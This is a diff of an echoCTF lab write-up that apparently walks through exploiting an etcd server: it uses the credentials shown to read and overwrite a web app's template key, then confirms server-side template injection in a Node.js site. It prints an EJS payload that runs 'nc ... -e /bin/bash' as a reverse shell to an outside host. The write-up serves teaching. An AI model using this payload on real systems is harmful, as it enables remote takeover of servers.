@@ -57,7 +57,7 @@ mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.
 User: nodejs
 Roles: etsctf
 ```
-<br>
+
 From the above query we can see that we have the role `etsctf`. Now we try to see what permissions are available for this role and what we can achieve with it.
 ```
 mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 role get etsctf
@@ -80,7 +80,7 @@ mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.
 /nodejs/index
 ```
 
-Viewing the value stored in the "/nodejs/index" key.
+Viewing the value stored in the `/nodejs/index` key.
 ```
 mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/index"
 
@@ -101,9 +101,9 @@ mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.
       </body>
 </html>
 ```
-<br>
+
 From the content of the `/nodejs/index` key we observe and find out that it is the source code for the web site we saw earlier running on port `1337`. Furthermore, we can also see that the source code does some server side rendering and hence may be vulnerable to SSTI. From our initial Nmap scan, nmap reported that the service running on port `1337` was powered by Node.js (Express middleware). This can guide us to know the kind of code to execute inorder to obtain RCE.
-<br>
+
 ### Testing our theory.
 Since we have write access to `/nodejs/index` key we will write our own content to verify if we can obtain code exeuction. Payload: `Bingo: <%= 7*7 %>`
 ```
@@ -114,7 +114,7 @@ We reload the web app on port `1337` and bingo!!! <br>
 ![SSTI PoC](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/ssti_1337_poc.png)
 
 After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target. <br>
-Payload: `<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`
+Payload:`<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`
 
 We will further leverage this to obtain a revervseshell using the payload above.
 ```
